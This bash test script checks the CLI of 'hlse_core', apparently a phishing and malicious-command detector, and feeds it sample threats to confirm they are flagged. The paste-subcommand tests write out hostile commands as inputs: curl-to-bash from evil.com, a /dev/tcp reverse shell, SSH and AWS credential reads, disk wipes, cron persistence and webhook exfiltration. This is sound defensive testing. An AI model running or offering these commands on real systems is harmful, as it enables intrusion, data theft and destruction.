#!/bin/bash
# tests/cli_integration.sh
#
# End-to-end CLI integration tests for hlse_core.
# Verifies exit codes, stdout/stderr separation, and JSON parseability.

set -eu

PASS=0
FAIL=0

check() {
    local name="$1"
    local expected="$2"
    local actual="$3"

    if [ "$expected" = "$actual" ]; then
        echo "PASS  $name"
        PASS=$((PASS + 1))
    else
        echo "FAIL  $name"
        echo "      expected: $expected"
        echo "      actual:   $actual"
        FAIL=$((FAIL + 1))
    fi
}

# jcheck: JSON-structural assertion — the structured-verdict successor of
# `| grep -q pattern`. A grep only proves the wording appeared; jcheck
# runs the subcommand with --json and asserts score, action band, signal
# bits, and reasons[]/classes[] content via a Python expression bound to
# `d` (see tests/json_check.py).
jcheck() {
    local name="$1" expr="$2"
    shift 2
    if ./hlse_core --json "$@" 2>/dev/null \
        | python3 "$HLSE_ROOT/tests/json_check.py" "$expr"; then
        PASS=$((PASS + 1))
        echo "PASS  $name"
    else
        FAIL=$((FAIL + 1))
        echo "FAIL  $name  (json_check: $expr)"
    fi
}

# jband_expr: translate a grep band pattern — 'OK' or an alternation of
# action names ('ALERT|BLOCK', 'ALERT\|BLOCK\|ISOLATE') — into a jcheck
# expression. Non-band wording (e.g. secret-type labels) falls back to a
# whole-verdict substring assert, mirroring the original grep semantics.
# $2 is the subcommand kind ('secret' gets the findings[]-shaped verdict).
jband_expr() {
    local pat="${1//\\/}" p parts="" allband=1
    if [ "$pat" = "OK" ]; then
        if [ "$2" = "secret" ]; then
            printf 'd["score"] == 0 and d["findings"] == []'
        else
            printf 'd["score"] == 0 and d["reasons"] == []'
        fi
        return
    fi
    local IFS='|'
    for p in $pat; do
        case "$p" in
            LOG|ALERT|BLOCK|ISOLATE) parts="${parts}\"${p}\", " ;;
            *) allband=0 ;;
        esac
    done
    if [ "$allband" -eq 1 ] && [ -n "$parts" ]; then
        printf 'd["action"] in [%s]' "${parts%, }"
    else
        printf '"%s" in str(d)' "$1"
    fi
}

cd "$(dirname "$0")/.."
HLSE_ROOT=$(pwd)   # absolute path for checks that cd into a temp dir
[ -x ./hlse_core ] || { echo "Build hlse_core first: make"; exit 2; }

# ─── exit codes ─────────────────────────────────────────────────────────

# Safe URL → exit 0
./hlse_core "https://github.com" >/dev/null 2>&1
check "Safe URL exits 0" "0" "$?"

# Malicious URL (BLOCK score) → exit 1
./hlse_core "https://paypal.com.attacker.xyz/verify" >/dev/null 2>&1 \
    && rc=0 || rc=$?
check "Malicious URL exits 1" "1" "$rc"

# Safe text → exit 0
./hlse_core text "Meeting tomorrow" >/dev/null 2>&1
check "Safe text exits 0" "0" "$?"

# Scam text (BLOCK) → exit 1
./hlse_core text "Microsoft Support: your PC has a virus, send gift cards now URGENT" \
    >/dev/null 2>&1 && rc=0 || rc=$?
# Allow either 0 or 1 since score might be ALERT (0) or BLOCK (1)
case "$rc" in
    0|1) PASS=$((PASS + 1)); echo "PASS  Scam text exit code valid ($rc)" ;;
    *)   FAIL=$((FAIL + 1)); echo "FAIL  Scam text bad exit code ($rc)" ;;
esac

# Help flag
./hlse_core --help >/dev/null 2>/tmp/hlse_help_err
[ -s /tmp/hlse_help_err ] && PASS=$((PASS + 1)) \
    && echo "PASS  --help writes to stderr" \
    || { FAIL=$((FAIL + 1)); echo "FAIL  --help should write to stderr"; }

# ─── JSON output ────────────────────────────────────────────────────────

# JSON parseability via Python
JSON_OUT=$(./hlse_core --json "https://g00gle.com")
echo "$JSON_OUT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "url"
assert data["score"] >= 40
assert "reasons" in data and len(data["reasons"]) > 0
' && check "JSON URL output parseable" "0" "0" \
   || check "JSON URL output parseable" "0" "1"

JSON_OUT=$(./hlse_core --json text "URGENT wire 5000")
echo "$JSON_OUT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "text"
assert data["score"] >= 30
' && check "JSON text output parseable" "0" "0" \
   || check "JSON text output parseable" "0" "1"

# ─── stdin pipe ─────────────────────────────────────────────────────────

# Mixed stdin input
STDIN_OUT=$(printf '%s\n' "https://g00gle.com" "https://github.com" \
            "URGENT wire money" "Meeting tomorrow" \
            | ./hlse_core --stdin || true)

echo "$STDIN_OUT" | grep -q "ALERT.*g00gle" \
    && check "stdin: detects malicious URL" "0" "0" \
    || check "stdin: detects malicious URL" "0" "1"

echo "$STDIN_OUT" | grep -q "OK.*github" \
    && check "stdin: passes legit URL" "0" "0" \
    || check "stdin: passes legit URL" "0" "1"

# stdin text output carries the attack-pattern label (parity with --json).
printf '%s\n' "https://discordd.com/login" | jcheck "stdin: text output includes Pattern label" '"typosquat" in d.get("pattern","").lower()' --stdin

# stdin pipe mode honours --fail-on (was hardcoded at BLOCK/60).
rc=0; printf '%s\n' "https://bit.ly/abc123" | ./hlse_core --stdin --fail-on log >/dev/null 2>&1 || rc=$?
check "stdin: --fail-on log fails a LOG finding → exit 1" "1" "$rc"
# Default gate (60) spares the same LOG finding in stdin mode → exit 0.
rc=0; printf '%s\n' "https://bit.ly/abc123" | ./hlse_core --stdin >/dev/null 2>&1 || rc=$?
check "stdin: default gate spares a LOG finding → exit 0" "0" "$rc"

# ─── self-test integration ──────────────────────────────────────────────

./hlse_core --self-test 2>&1 | grep -qE "[0-9]+ passed, 0 failed" \
    && check "self-test URL all pass" "0" "0" \
    || check "self-test URL all pass" "0" "1"

./hlse_core --self-test 2>&1 | grep -qE "Text tests: [0-9]+ passed, 0 failed" \
    && check "self-test text all pass" "0" "0" \
    || check "self-test text all pass" "0" "1"

# ─── benchmark integration ──────────────────────────────────────────────

./hlse_core --benchmark 2>&1 | grep -q "F1:        1.000" \
    && check "benchmark F1=1.000" "0" "0" \
    || check "benchmark F1=1.000" "0" "1"

# ─── Apple-style features ──────────────────────────────────────────────

# No-arg demo: should print live demo and exit 0
./hlse_core 2>&1 | grep -q "phishing & scam detection" \
    && check "no-arg demo shows product intro" "0" "0" \
    || check "no-arg demo shows product intro" "0" "1"

# --version
./hlse_core --version 2>&1 | grep -qE "hlse_core [0-9]+\.[0-9]+\.[0-9]+" \
    && check "--version shows semver" "0" "0" \
    || check "--version shows semver" "0" "1"

# Empty string → error (not OK)
./hlse_core "" 2>&1 | grep -q "Nothing to scan" \
    && check "empty input → meaningful error" "0" "0" \
    || check "empty input → meaningful error" "0" "1"

# Unified scan: text without 'text' subcommand
jcheck "auto-detect text (no 'text' subcommand needed)" 'd["action"] in ["ALERT", "BLOCK", "LOG", "ISOLATE"]' "URGENT wire 5000 immediately gift card"

# ─── protect subcommand ─────────────────────────────────────────────

# protect on a clean dir → should exit 0 (fresh empty dir: /tmp can
# legitimately trip R1 mass-mod detection on a busy host)
PROT_CLEAN0=$(mktemp -d)
./hlse_core protect "$PROT_CLEAN0" >/dev/null 2>&1
check "protect clean dir exits 0" "0" "$?"
rm -rf "$PROT_CLEAN0"

# protect with ransom note
PROT_DIR=$(mktemp -d)
echo "Your files encrypted" > "$PROT_DIR/HOW_TO_DECRYPT.txt"
jcheck "protect detects ransom note" '("r3" in str(d).lower() or "ransom" in str(d).lower())' protect "$PROT_DIR"

# JSON protect output
JSON_PROT=$(./hlse_core --json protect "$PROT_DIR" 2>&1)
echo "$JSON_PROT" | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "protect"
assert data["score"] >= 30
assert "reasons" in data
' && check "--json protect parseable" "0" "0" \
   || check "--json protect parseable" "0" "1"

# reason_ids: per-finding stable ids (HLSE-PROTECT-R3) on ransom note
echo "$JSON_PROT" | grep -q '"reason_ids":\[[^]]*"HLSE-PROTECT-R3"' \
    && check "protect: reason_ids carry HLSE-PROTECT-R3" "0" "0" \
    || check "protect: reason_ids carry HLSE-PROTECT-R3" "0" "1"

# clean protect still emits empty reason_ids (schema stability) —
# use a fresh empty dir: /tmp can legitimately trip R1 (mass-mod
# burst) on a busy host, which is not what this check exercises.
PROT_CLEAN=$(mktemp -d)
jcheck "protect: clean emits reason_ids:[]" "'\"reason_ids\":[]' in s" protect "$PROT_CLEAN"
rm -rf "$PROT_CLEAN"

rm -rf "$PROT_DIR"

# ─── esp subcommand (UEFI/ESP integrity) ────────────────────────────

# Clean ESP (benign .efi, no ransom text) → exit 0
ESP_DIR=$(mktemp -d)
mkdir -p "$ESP_DIR/EFI/BOOT"
head -c 4096 /dev/urandom > "$ESP_DIR/EFI/BOOT/BOOTX64.EFI"
./hlse_core esp "$ESP_DIR" >/dev/null 2>&1
check "esp: clean ESP exits 0" "0" "$?"

# Malicious .efi carrying a ransom-note phrase → BLOCK (exit 1)
printf 'MZ payload all your files have been encrypted pay bitcoin' \
    > "$ESP_DIR/EFI/BOOT/evil.efi"
jcheck "esp: detects ransom string in .efi" '("e3" in str(d).lower() or "encrypted" in str(d).lower())' esp "$ESP_DIR"
./hlse_core esp "$ESP_DIR" >/dev/null 2>&1 && rc=0 || rc=$?
check "esp: malicious ESP exits 1" "1" "$rc"

# Non-.efi file with the same text must NOT be scanned (extension filter)
ESP_DIR2=$(mktemp -d); mkdir -p "$ESP_DIR2/EFI"
printf 'all your files have been encrypted pay bitcoin' > "$ESP_DIR2/EFI/notes.txt"
./hlse_core esp "$ESP_DIR2" >/dev/null 2>&1
check "esp: ignores non-.efi files" "0" "$?"

# Missing ESP path → graceful exit 0
./hlse_core esp "$ESP_DIR/nope" >/dev/null 2>&1
check "esp: missing path exits 0 (graceful)" "0" "$?"

# reason_ids: per-finding stable ids (HLSE-ESP-E3) on a flagged .efi
jcheck "esp: reason_ids carry HLSE-ESP-E3" "'HLSE-ESP-E3' in str(d[\"reason_ids\"])" esp "$ESP_DIR"

# JSON parseable
./hlse_core --json esp "$ESP_DIR" 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "esp"
assert "reasons" in data
' && check "--json esp parseable" "0" "0" \
   || check "--json esp parseable" "0" "1"

rm -rf "$ESP_DIR" "$ESP_DIR2"

# ─── package subcommand ─────────────────────────────────────────────

# Exact match → safe
jcheck "package: exact 'requests' → OK" 'd["score"] == 0' package requests pip

# Typosquat → detected
jcheck "package: 'reqeusts' typosquat detected" 'd["action"] in ["BLOCK", "ALERT"]' package reqeusts pip

# JSON output
./hlse_core --json package reqeusts pip 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "package"
assert data["score"] >= 40
' && check "--json package parseable" "0" "0" \
   || check "--json package parseable" "0" "1"


# npm lifecycle-hook risk (Shai-Hulud-style install worms)
mkdir -p /tmp/hlse_hooktest.$$
printf '%s\n' '{"scripts":{"postinstall":"node bundle.js"},"dependencies":{"lodash":"4.17.21"}}' \
    > /tmp/hlse_hooktest.$$/package.json
jcheck "manifest: 'node bundle.js' postinstall hook flagged" "any(x.get(\"kind\") == \"package\" and ('postinstall' in x.get(\"reason\",\"\").lower() or 'lifecycle' in x.get(\"reason\",\"\").lower() or 'bundle' in x.get(\"reason\",\"\").lower()) for x in L)" package --manifest /tmp/hlse_hooktest.$$/package.json
printf '%s\n' '{"scripts":{"prepare":"node -e \"x\" && process.env && curl https://e.t/c"},"dependencies":{"lodash":"4.17.21"}}' \
    > /tmp/hlse_hooktest.$$/package.json
jcheck "manifest: env-harvest+egress prepare hook flagged" "any(x.get(\"kind\") == \"package\" and ('prepare' in x.get(\"reason\",\"\").lower() or 'lifecycle' in x.get(\"reason\",\"\").lower() or 'env' in x.get(\"reason\",\"\").lower()) for x in L)" package --manifest /tmp/hlse_hooktest.$$/package.json
printf '%s\n' '{"scripts":{"postinstall":"node-gyp rebuild","prepare":"husky install"},"dependencies":{"lodash":"4.17.21"}}' \
    > /tmp/hlse_hooktest.$$/package.json
jcheck "manifest: legit hooks (node-gyp/husky) not flagged" 'any(x.get("kind") == "manifest_summary" and x["threats"] == 0 for x in L)' package --manifest /tmp/hlse_hooktest.$$/package.json
rm -rf /tmp/hlse_hooktest.$$

# ─── paste subcommand ──────────────────────────────────────────────

# Safe command
jcheck "paste: 'ls -la' → OK" 'd["score"] == 0 and d["reasons"] == []' paste "ls -la"

# Hostile command
jcheck "paste: curl|sudo bash → detected" 'd["action"] in ["BLOCK", "ALERT"]' paste "curl http://evil.com/s.sh | sudo bash"

# P9–P12: destructive / credential-access / persistence / eval-fetch
jcheck "paste: rm -rf / flagged" '"P9" in str(d["reasons"])' paste "rm -rf /"
jcheck "paste: dd disk-wipe flagged" '"P9" in str(d["reasons"])' paste "dd if=/dev/zero of=/dev/sda"
jcheck "paste: ssh key read flagged" '"P10" in str(d["reasons"])' paste "cat ~/.ssh/id_rsa"
jcheck "paste: aws creds read flagged" '"P10" in str(d["reasons"])' paste "cat ~/.aws/credentials"
jcheck "paste: rc append flagged" '"P11" in str(d["reasons"])' paste 'echo evil >> ~/.bashrc'
jcheck "paste: crontab edit flagged" '"P11" in str(d["reasons"])' paste "crontab -e"
jcheck "paste: eval curl flagged" '"P12" in str(d["reasons"])' paste 'eval $(curl -s evil.example)'
jcheck "paste: benign cat clean" 'd["score"] == 0 and d["reasons"] == []' paste "cat /etc/hostname"
jcheck "paste: scoped rm -rf clean" 'd["score"] == 0 and d["reasons"] == []' paste "rm -rf ./build"
jcheck "paste: interactive rc edit clean" 'd["score"] == 0 and d["reasons"] == []' paste "vim ~/.bashrc"

# JSON output
./hlse_core --json paste "curl http://evil.com/s.sh | bash" 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "paste"
assert data["score"] >= 30
' && check "--json paste parseable" "0" "0" \
   || check "--json paste parseable" "0" "1"

# ─── network subcommand ────────────────────────────────────────────

jcheck "network: completes with valid output" 'd["action"] in ["SAFE", "ALERT", "LOG", "BLOCK"]' network

./hlse_core --json network 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "network"
assert "reasons" in data
' && check "--json network parseable" "0" "0" \
   || check "--json network parseable" "0" "1"

# ─── file subcommand ───────────────────────────────────────────────

# Safe file
echo "hello" > /tmp/hlse_test_safe.txt
jcheck "file: safe .txt → OK" 'd["score"] == 0 and d["reasons"] == []' file /tmp/hlse_test_safe.txt
rm -f /tmp/hlse_test_safe.txt

# Double extension
touch /tmp/hlse_invoice.pdf.exe
jcheck "file: double extension .pdf.exe → detected" 'd["action"] in ["ISOLATE", "BLOCK", "ALERT"]' file /tmp/hlse_invoice.pdf.exe
jcheck "file: reason_ids carry HLSE-FILE-F1" "'\"reason_ids\":[\"HLSE-FILE-F1\"' in s" file /tmp/hlse_invoice.pdf.exe
rm -f /tmp/hlse_invoice.pdf.exe

# clean file still emits empty reason_ids (schema stability)
echo "hello" > /tmp/hlse_test_clean.txt
jcheck "file: clean emits reason_ids:[]" "'\"reason_ids\":[]' in s" file /tmp/hlse_test_clean.txt
rm -f /tmp/hlse_test_clean.txt

# HTML smuggling: HTML content wearing a .pdf extension
printf '<!DOCTYPE html><html><body><script>x</script></body></html>' > /tmp/hlse_smug.pdf
jcheck "file: HTML-as-.pdf masquerade → detected" '"html" in str(d).lower()' file /tmp/hlse_smug.pdf
rm -f /tmp/hlse_smug.pdf

# FP guard: a genuine .html file must NOT be flagged as a masquerade
printf '<!DOCTYPE html><html></html>' > /tmp/hlse_real.html
jcheck "file: genuine .html NOT flagged as masquerade" 'not ("magic mismatch" in str(d).lower())' file /tmp/hlse_real.html
rm -f /tmp/hlse_real.html

# ─── audit subcommand ──────────────────────────────────────────────

jcheck "audit: completes with valid output" '("ok" in str(d).lower() or "alert" in str(d).lower() or "log" in str(d).lower() or "block" in str(d).lower() or "high" in str(d).lower() or "med" in str(d).lower() or "low" in str(d).lower())' audit

./hlse_core --json audit 2>&1 | python3 -c '
import sys, json
data = json.loads(sys.stdin.read())
assert data["kind"] == "audit"
assert "findings" in data
hi = data["hardening_index"]
assert 0 <= hi <= 100
assert hi == 100 - min(data["score"], 100)
assert data["hardening_band"] in ("hardened", "good", "fair", "weak")
' && check "--json audit has hardening_index" "0" "0" \
   || check "--json audit has hardening_index" "0" "1"

# Human-readable output shows the hardening index
jcheck "audit: prints hardening index" '"hardening_index" in d' audit

# ─── compound detection ────────────────────────────────────────────

# Embedded phishing URL in urgency text → compound score
jcheck "embedded phishing URL + urgency → compound BLOCK+" 'd["action"] in ["BLOCK", "ISOLATE"]' "URGENT: click https://g00gle.com/signin now"

# ClickFix fake-CAPTCHA paste-and-run → BLOCK/ISOLATE
jcheck "ClickFix fake-CAPTCHA paste-and-run → BLOCK+" 'd["action"] in ["BLOCK", "ISOLATE"]' "To verify you are human, press Windows + R, then paste this command and hit Enter"

# ClickFix legit IT instruction (Win+R + type cmd, no paste-execute) → not flagged
jcheck "ClickFix FP guard: legit Win+R IT instruction stays low" '("ok" in str(d).lower() or "log" in str(d).lower())' "Press Windows + R to open the Run dialog, then type cmd to launch the command prompt."

# P8 multi-hold: an input matching >=2 chain classes names secondary hits
jcheck "P8 multi-hold names secondary class hits" '"(also:" in str(d)' paste 'powershell -enc SQBFAFgA && certutil -urlcache http://x'

# P8 multi-hold keeps the score at a single top-tier value (no score
# inflation): both hits are 65-tier remote-execution cradles → 65, not 130
jcheck "P8 multi-hold keeps single top-tier score" 'd["score"] == 65' paste 'powershell -enc SQBFAFgA && certutil -urlcache http://x'

# P8 severity tiers: state-changing primitive = 55, read-only enum /
# name-mention = 45, remote-execution cradle = 65
jcheck "P8 tier: host primitive scores 55" 'd["score"] == 55' paste 'schtasks /create /ru SYSTEM /tn t /tr c'
jcheck "P8 tier: read-only enum stays 45" 'd["score"] == 45' paste 'find . -perm 4000'
jcheck "P8 tier: mixed hits take max severity + label" 'd["score"] == 55 and "schtasks" in d["reasons"][0]' paste 'komga && schtasks /create /ru SYSTEM /tn t /tr c'
jcheck "P8 tier: remote package install scores 65" 'd["score"] == 65' paste 'brew install http://evil.example/pkg'
jcheck "P8 tier: npx remote package exec scores 65" 'd["score"] == 65' paste 'npx http://evil.example/tool'
jcheck "P8 tier: file-upload exfil scores 55" 'd["score"] == 55' paste 'curl -X POST -F "file=@loot.zip" https://discord.com/api/webhooks/1/x'
jcheck "P8: defanged hxxps still counts as remote" 'd["score"] == 65' paste 'mshta.exe hxxps://files.example.net/captcha.hta'
jcheck "P8: benign pkg-mgr install stays ALERT band" 'd["score"] == 45' paste 'brew install wget'

# reason_ids: per-block stable dedup keys (HLSE-PASTE-P<n>) — cycle-478.
# P9/P10 kept their original meanings; the later colliding blocks moved
# to P16/P17 so no code carries two detection meanings.
jcheck "reason_ids: multi-block emits all block ids" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P8","HLSE-PASTE-P16"]' paste 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 && powershell -enc http://x.evil/a.ps1 && curl http://x | sh'
jcheck "reason_ids: destructive payload keeps P9" 'd.get("reason_ids") == ["HLSE-PASTE-P9"]' paste 'rm -rf /'
jcheck "reason_ids: persistence injection is P17" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P11","HLSE-PASTE-OTHER","HLSE-PASTE-P17"]' paste 'echo "* * * * * curl http://x.evil/a.sh | sh" | crontab -'
jcheck "reason_ids: uncoded compound falls back to OTHER" 'd.get("reason_ids") == ["HLSE-PASTE-P2","HLSE-PASTE-P4","HLSE-PASTE-OTHER"]' paste 'sudo curl http://x.evil/a.sh | sudo sh'
jcheck "reason_ids: clean paste emits empty array" 'd.get("reason_ids") == []' paste 'echo hello'

# pkg-mgr remote/bundle install tier parity: apt URL/.deb and dpkg -i
# .deb are the same download-and-run-payload shape as rpm/dnf/brew/
# choco/snap remote installs — all 65 BLOCK (was 55, cycle-479).
# Bare mainstream installs stay 0 by deliberate FP calibration
# (existing guards: apt/apt-get/pip/gem/yum/pacman/apk bare = clean).
jcheck "pkg-mgr: remote apt URL install scores 65" 'd["score"] == 65' paste 'apt install http://evil.example/x.deb'
jcheck "pkg-mgr: local apt .deb bundle scores 65" 'd["score"] == 65' paste 'apt install ./x.deb'
jcheck "pkg-mgr: dpkg bundle install scores 65" 'd["score"] == 65' paste 'dpkg -i pkg.deb'
jcheck "pkg-mgr: bare apt install stays clean" 'd["score"] == 0' paste 'apt install curl'
jcheck "pkg-mgr: bare pip install stays clean" 'd["score"] == 0' paste 'pip install requests'
jcheck "pkg-mgr: read-only apt update stays 0" 'd["score"] == 0' paste 'apt update'

# nx needle cross-fire fix (cycle-480): "nx " matched inside "lynx "/"manx ",
# making every lynx invocation false-fire the monorepo class. lynx is a
# legitimate fetch tool (listed in the fetch-tool tables) — excluded alongside
# the existing sphinx/minx/nginx exclusions.
jcheck "nx-needle: lynx pipe scores P2 only" 'd["score"] == 40' paste 'lynx -source http://x | sh'
jcheck "nx-needle: bare lynx fetch stays clean" 'd["score"] == 0' paste 'lynx -dump http://x'
jcheck "nx-needle: manx does not cross-fire" 'd["score"] == 0' paste 'manx cat'
jcheck "nx-needle: genuine nx build still fires" 'd["score"] == 45' paste 'nx build app'

# Tool-name substring cross-fire sweep (cycle-481): the same nx-needle defect
# family recurred wherever a short tool name is a substring of a real word —
# nix⊂unix/phoenix, uv⊂luv, "v run"⊂"luv run", rye⊂dryer, just⊂adjust,
# mage⊂magenta, nx⊂snx/phalanx/jinx/pinx, "nvi "⊂"envi ", "vis "⊂"pelvis ".
# Each arm now excludes the containing word; genuine tool names still fire.
jcheck "crossfire: unix shell stays clean" 'd["score"] == 0' paste 'unix shell'
jcheck "crossfire: phoenix run stays clean" 'd["score"] == 0' paste 'phoenix run'
jcheck "crossfire: luv run stays clean" 'd["score"] == 0' paste 'luv run'
jcheck "crossfire: dryer add stays clean" 'd["score"] == 0' paste 'dryer add x'
jcheck "crossfire: adjust stays clean" 'd["score"] == 0' paste 'adjust -x'
jcheck "crossfire: magenta stays clean" 'd["score"] == 0' paste 'magenta run'
jcheck "crossfire: phalanx stays clean" 'd["score"] == 0' paste 'phalanx troops'
jcheck "crossfire: jinx stays clean" 'd["score"] == 0' paste 'jinx -u'
jcheck "crossfire: envi check stays clean" 'd["score"] == 0' paste 'envi check'
